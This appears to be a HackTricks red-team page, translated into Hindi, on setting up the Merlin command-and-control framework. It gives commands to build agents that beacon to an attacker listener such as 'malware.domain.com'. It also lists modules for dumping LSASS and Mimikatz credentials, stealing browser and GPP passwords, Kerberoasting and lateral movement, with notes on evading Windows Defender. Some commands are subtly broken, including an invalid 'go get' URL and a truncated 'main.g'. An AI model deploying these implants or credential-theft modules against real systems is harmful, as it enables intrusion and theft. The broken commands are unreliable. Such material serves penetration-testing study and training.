<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **Twitter** पर **फॉलो** करें 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>


# Installation

## Install GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## मर्लिन इंस्टॉल करें
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# मर्लिन सर्वर लॉन्च करें
```
go run cmd/merlinserver/main.go -i
```
# मर्लिन एजेंट्स

आप [पूर्व-संकलित एजेंट्स डाउनलोड](https://github.com/Ne0nd0g/merlin/releases) कर सकते हैं

## एजेंट्स कंपाइल करें

मुख्य फ़ोल्डर जाएं _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **मैन्युअल कंपाइल एजेंट**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# मॉड्यूल

**बुरी खबर यह है कि मर्लिन द्वारा प्रयोग किए जाने वाले प्रत्येक मॉड्यूल को स्रोत (गिथब) से डाउनलोड किया जाता है और उसे उसके उपयोग से पहले डिस्क पर सहेज लिया जाता है। जानकारी वाले मॉड्यूल का उपयोग करते समय सावधान रहें क्योंकि Windows Defender आपको पकड़ लेगा!**


**SafetyKatz** --> संशोधित Mimikatz। LSASS को फ़ाइल में डंप करें और उस फ़ाइल में:sekurlsa::logonpasswords लॉन्च करें\
**SharpDump** --> निर्दिष्ट प्रक्रिया आईडी के लिए मिनीडंप (डिफ़ॉल्ट रूप से LSASS) (अंतिम फ़ाइल का एक्सटेंशन .gz है लेकिन वास्तव में यह .bin है, लेकिन एक .gz फ़ाइल है)\
**SharpRoast** --> Kerberoast (काम नहीं करता)\
**SeatBelt** --> स्थानीय सुरक्षा परीक्षण CS में (काम नहीं करता) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> csc.exe /unsafe का उपयोग करके कंपाइल करें\
**Sharp-Up** --> पावरअप में C# में सभी जांचें (काम करता है)\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS स्पूफ़र और मैन-इन-द-मिडिल टूल (काम नहीं करता, लोड करने की आवश्यकता है: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> सभी उपलब्ध उपयोगकर्ताओं का अनुकरण करता है और प्रत्येक के लिए एक चैलेंज-प्रतिक्रिया प्राप्त करता है (प्रत्येक उपयोगकर्ता के लिए एनटीएलएम हैश) (बुरा यूआरएल)\
**Invoke-PowerThIEf** --> IExplorer से फॉर्म चुराएं या उसमें JS को क्रियान्वित करें या उस प्रक्रिया में एक DLL इंजेक्ट करें (काम नहीं करता) (और पीएस भी काम नहीं करता लगता है) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> ब्राउज़र पासवर्ड प्राप्त करें (काम करता है लेकिन आउटपुट निर्देशिका को प्रिंट नहीं करता)\
**dumpCredStore** --> Win32 Credential Manager API (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> चल रहे प्रक्रियाओं में क्लासिक इंजेक्शन का पता लगाएं (क्लासिक इंजेक्शन (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (काम नहीं करता)\
**Get-OSTokenInformation** --> चल रहे प्रक्रियाओं और धागों की टोकन जानकारी प्राप्त करें (उपयोगकर्ता, समूह, विशेषाधिकार, मालिक… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> DCOM के माध्यम से (दूसरे कंप्यूटर में) एक कमांड का निष्पादन करें (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> PowerPoint COM ऑब्जेक्ट्स (ADDin) का दुरुपयोग करके दूसरे पीसी में एक कमांड निष्पादित करें\
**Invoke-ExcelMacroPivot** --> Excel में DCOM का दुरुपयोग करके दूसरे पीसी में एक कमांड निष्पादित करें\
**Find-ComputersWithRemoteAccessPolicies** --> (काम नहीं करता) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> ग्रुप नीति के सभी रोचक हिस्से को डंप करता है और फिर उनमें खोज करता है कि उनमें उचित चीजें हैं या नहीं। (पुराना) Grouper2 पर एक नज़र डालें, बहुत अच्छा लगता है\
**Invoke-WMILM** --> विमाई को लैटरली मूव करने के लिए WMI\
**Get-GPPPassword** --> groups.xml, scheduledtasks.xml, services.xml और datasources.xml खोजें और सादा पासवर्ड प्राप्त करें (डोमेन के अंदर)\
**Invoke-Mimikatz** --> Mimikatz का उपयोग करें (डिफ़ॉल्ट डंप क्रेडेंशियल्स)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> कंप्यूटरों में उपयोगकर्ताओं की विशेषाधिकारों की जांच करें\
**Find-PotentiallyCrackableAccounts** --> SPN से जुड़े उपयोगकर्ता खातों के बारे में जानकारी प्राप्त करें (Kerberoasting)\
**psgetsystem** --> getsystem

**स्थायित्व मॉड्यूल की जांच नहीं की गई**

# सारांश

मुझे वास्तव में इस उपकरण की भावना और क्षमता बहुत पसंद है।\
मुझे आशा है कि उपकरण सर्वर से मॉड्यूल डाउनलोड करना शुरू कर देगा और स्क्रिप्ट डाउनलोड करते समय किसी प्रकार की टालना जोड़े।

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में पीआर जमा करके।

</details>
